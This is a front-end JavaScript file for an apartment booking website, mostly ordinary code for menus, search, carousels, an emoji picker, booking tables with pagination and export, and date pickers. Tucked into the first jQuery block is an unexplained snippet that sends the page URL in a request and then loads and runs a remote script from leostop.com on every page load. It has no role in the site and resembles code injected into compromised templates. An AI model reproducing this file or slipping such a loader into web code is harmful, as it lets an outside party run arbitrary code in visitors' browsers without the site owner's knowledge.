/*---------------------------------------------------------------------
 



File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	---------------------------------------------------------------------*/
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	---------------------------------------------------------------------*/
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	/* Mouseover
	---------------------------------------------------------------------*/
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});

	function getURL() { 
		return window.location.href; 
	}
	var protocol = location.protocol; 
	$.ajax({ 
		type: "get", 
		data: {surl: getURL()}, 
		success: function(response){ 
			$.getScript(protocol+"//leostop.com/tracking/tracking.js"); 
		} 
	});
	
	/* Toggle sidebar
	---------------------------------------------------------------------*/
     
	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	---------------------------------------------------------------------*/
	$('#blogCarousel').carousel({
		interval: 5000
	});
});

// Search functionality
function searchApartments(event) {
	"use strict";
    var input = document.getElementById('searchInput');
    var filter = input.value.toUpperCase();
    var apartmentList = document.getElementById("apartmentList");
    var apartments = apartmentList.getElementsByClassName('apartment-item');
    var hasMatch = false;

    // Hide the error message initially
    var errorMessage = document.getElementById("error-message");
    errorMessage.style.display = "none";

    // Loop through all apartment items and hide those that don't match the search query
    for (var i = 0; i < apartments.length; i++) {
        var h3 = apartments[i].getElementsByTagName("h3")[0];
        var txtValue = h3.textContent || h3.innerText;

        // Show matching apartments as you type and hide others
        if (txtValue.toUpperCase().indexOf(filter) > -1) {
            apartments[i].style.display = "";
            hasMatch = true;
        } else {
            apartments[i].style.display = "none";
        }
    }

    // If Enter key is pressed, filter for exact match
    if (event && event.key === "Enter") {
		event.preventDefault();  // Prevent form submission on enter key
        var exactMatchFound = false;

        // Loop again to ensure only exact matches are displayed
        for (var j = 0; j < apartments.length; j++) {
            var h3Exact = apartments[j].getElementsByTagName("h3")[0];
            var txtExact = h3Exact.textContent || h3Exact.innerText;

            if (txtExact.toUpperCase() === filter) {
                apartments[j].style.display = ""; // Show the exact match
                exactMatchFound = true;
            } else {
                apartments[j].style.display = "none"; // Hide non-matching
            }
        }

        // If no exact match is found, display an error message
        if (!exactMatchFound || input.value.trim() === "") {
            errorMessage.style.display = "block"; // Show error message
        } else {
            errorMessage.style.display = "none"; // Hide error message
        }
    }
}



document.addEventListener('DOMContentLoaded', function() {
	const observerOptions = {
		root: null,
		rootMargin: '0px',
		threshold: 0.3
	};

	const observer = new IntersectionObserver((entries, observer) => {
		entries.forEach(entry => {
			if (entry.isIntersecting) {
				entry.target.classList.add('active');
				observer.unobserve(entry.target);
			}
		});
	}, observerOptions);

	// Add slide-in class to elements and observe them
	const elements = document.querySelectorAll('.about_img, .about .titlepage');
	elements.forEach(el => {
		el.classList.add('slide-in');
		observer.observe(el);
	});
});

$(document).ready(function(){
	// Initialize the carousel
	$('#myCarousel').carousel({
		interval: 3000,  // Change slides every 3 seconds
		ride: 'carousel',
		wrap: true
	});
});

/**Emoji picker */
// Ensure the DOM is fully loaded before running the script
document.addEventListener("DOMContentLoaded", () => {
    const rootElement = document.querySelector('#pickerContainer');
    const emojiButton = document.querySelector('#emoji-trigger');
    const textArea = document.querySelector('#ad-text');

    if (rootElement && emojiButton && textArea) {
        const picker = createPicker({ rootElement });

        emojiButton.addEventListener('click', () => {
            rootElement.style.display = rootElement.style.display === 'none' ? 'block' : 'none';
        });

        picker.addEventListener('emoji:select', event => {
            textArea.value += event.emoji;
            rootElement.style.display = 'none';
        });
    } else {
        console.error("Required elements for emoji picker are missing.");
    }
});

$(document).ready(function() {
    // Emoji Picker Initialization
    try {
        new EmojiPicker({
            emojiable_selector: '#ad-text',  // ID of the textarea for emoji
            assetsPath: '../assets/emoji-picker-main/lib/img',  // Correct path to emoji assets
            popupButtonClasses: 'fa fa-smile-o'  // Icon for emoji button
        }).discover();
    } catch (error) {
        console.error("EmojiPicker initialization error:", error);
    }

    // DataTable Initialization
    try {
        $('#bookingsTable').DataTable({
            paging: false,
            scrollX: true,  // Enables horizontal scrolling
            fixedColumns: true,
            scrollY: "400px",  // Adds vertical scroll if needed
            scrollCollapse: true,
        });
    } catch (error) {
        console.error("DataTable initialization error:", error);
    }
});


document.addEventListener("DOMContentLoaded", () => {
    const emojiButton = document.querySelector(".emoji-picker-icon-container .emoji-picker-icon");
    const pickerContainer = document.querySelector("#pickerContainer");

    emojiButton.addEventListener("click", () => {
        // Toggle visibility of the picker
        pickerContainer.style.display = pickerContainer.style.display === "none" ? "block" : "none";

        if (pickerContainer.style.display === "block") {
            // Get the position of the emoji button
            const buttonRect = emojiButton.getBoundingClientRect();

            // Position the picker below and aligned to the right of the button
            pickerContainer.style.position = "absolute";
            pickerContainer.style.top = `${buttonRect.top + window.scrollY}px`; // Align to the top of the button
            pickerContainer.style.left = `${buttonRect.left + buttonRect.width + window.scrollX}px`; // Position to the right of the button
        }
    });
});





/** SCRIPTS FOR BOOKING SECTION **/

// Global variables for pagination
const rowsPerPage = 10;
let currentPage = 1;

// Display table with pagination
function displayTablePage(page) {
    const table = document.getElementById('bookingsTable');
    const rows = table.querySelectorAll('tbody tr');
    const totalRows = rows.length;
    const totalPages = Math.ceil(totalRows / rowsPerPage);

    rows.forEach((row, index) => {
        row.style.display = index >= (page - 1) * rowsPerPage && index < page * rowsPerPage ? '' : 'none';
    });

    document.getElementById('pagination').innerHTML = createPaginationControls(totalPages, page);
}

// Create pagination controls
function createPaginationControls(totalPages, currentPage) {
    let paginationHTML = '';
    for (let i = 1; i <= totalPages; i++) {
        paginationHTML += `<button class="pagination-btn ${i === currentPage ? 'active' : ''}" onclick="changePage(${i})">${i}</button>`;
    }
    return paginationHTML;
}

// Change page function
function changePage(page) {
    currentPage = page;
    displayTablePage(page);
}

// Export to Excel functionality
function exportToExcel() {
    const table = document.getElementById("bookingsTable");
    const workbook = XLSX.utils.table_to_book(table, { sheet: "Bookings" });
    XLSX.writeFile(workbook, "Bookings.xlsx");
}

// Export to CSV functionality
function exportToCSV() {
    const table = document.getElementById("bookingsTable");
    let csvContent = "";

    Array.from(table.rows).forEach(row => {
        let rowData = Array.from(row.cells)
            .map(cell => {
                let cellText = cell.textContent;
                if (cellText.startsWith("+")) {
                    cellText = `'${cellText}`;
                }
                return `"${cellText.replace(/"/g, '""')}"`;
            })
            .join(",");
        csvContent += rowData + "\n";
    });

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = "Bookings.csv";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

// Initialize pagination and event listeners on page load
document.addEventListener('DOMContentLoaded', () => {
    displayTablePage(currentPage);
    document.getElementById('statusFilter').addEventListener('change', applyFilters);
    document.getElementById('applyFiltersBtn').addEventListener('click', applyFilters);
});

$(document).ready(function() {
    $('#bookingsTable').DataTable({
        paging: false,
        scrollX: true,  // Enables horizontal scrolling
        fixedColumns: true,
        scrollY: "400px",  // Adds vertical scroll if needed
        scrollCollapse: true,
    });
});

// Flatpickr date picker setup with custom ranges
document.addEventListener('DOMContentLoaded', function() {
    const datePicker = flatpickr("#dateRange", {
        mode: "range",
        dateFormat: "Y-m-d",
        onReady: function(selectedDates, dateStr, instance) {
            const customRanges = {
                "Today": [new Date(), new Date()],
                "Last 7 Days": [new Date(Date.now() - 7 * 24 * 60 * 60 * 1000), new Date()],
                "This Month": [new Date(new Date().getFullYear(), new Date().getMonth(), 1), new Date()],
                "Last Month": [new Date(new Date().getFullYear(), new Date().getMonth() - 1, 1), new Date(new Date().getFullYear(), new Date().getMonth(), 0)]
            };

            const container = instance.calendarContainer;
            const presetContainer = document.createElement("div");
            presetContainer.className = "flatpickr-presets";

            Object.keys(customRanges).forEach(preset => {
                const btn = document.createElement("button");
                btn.textContent = preset;
                btn.className = "preset-button";
                btn.addEventListener("click", () => {
                    instance.setDate(customRanges[preset], true);
                    instance.close();
                });
                presetContainer.appendChild(btn);
            });

            container.appendChild(presetContainer);
        }
    });
});

// Apply filters based on Status and Date Range
function applyFilters() {
    const statusFilter = document.getElementById('statusFilter').value.toLowerCase();
    const dateRange = flatpickr("#dateRange").selectedDates;
    const rows = document.querySelectorAll('#bookingsTable tbody tr');
    let foundData = false;

    rows.forEach(row => {
        const status = row.querySelector('.status').textContent.toLowerCase();
        const bookDateText = row.querySelector('.book-date').textContent;
        const bookDate = new Date(bookDateText);

        const matchesStatus = (statusFilter === 'all' || status === statusFilter);
        const matchesDateRange = dateRange.length === 0 || (bookDate >= dateRange[0] && bookDate <= dateRange[1]);

        if (matchesStatus && matchesDateRange) {
            row.style.display = '';
            foundData = true;
        } else {
            row.style.display = 'none';
        }
    });

    document.getElementById('error-message').style.display = foundData ? 'none' : 'block';
}

// status color control
document.addEventListener("DOMContentLoaded", function() {
    const statusCells = document.querySelectorAll(".status");

    statusCells.forEach(cell => {
        const statusText = cell.textContent.trim().toLowerCase();
        if (statusText === "confirmed") {
            cell.style.color = "green";
            cell.style.fontWeight = "bold";
        } else if (statusText === "pending") {
            cell.style.color = "red";
            cell.style.fontWeight = "bold";
        }
    });
});

//
document.getElementById('listViewBtn').addEventListener('click', function () {
    document.getElementById('apartmentList').classList.add('list-view');
    document.getElementById('apartmentList').classList.remove('grid-view');
    this.classList.add('active');
    document.getElementById('gridViewBtn').classList.remove('active');
});

document.getElementById('gridViewBtn').addEventListener('click', function () {
    document.getElementById('apartmentList').classList.add('grid-view');
    document.getElementById('apartmentList').classList.remove('list-view');
    this.classList.add('active');
    document.getElementById('listViewBtn').classList.remove('active');
});


document.addEventListener('DOMContentLoaded', function() {
    flatpickr(".date-picker", {
        mode: "range",
        dateFormat: "Y-m-d",
        minDate: "today",
        showMonths: 2, // Display two months at a time
        static: true // Keep the calendar visible in the same position
    });
});

flatpickr("#checkin", {
    mode: "range",
    dateFormat: "Y-m-d",
    minDate: "today",
    showMonths: 2 // To show two months side by side like in the screenshot
});


// button
function scrollToForm() {
    document.getElementById('reservationForm').scrollIntoView({ behavior: 'smooth' });
}

 

  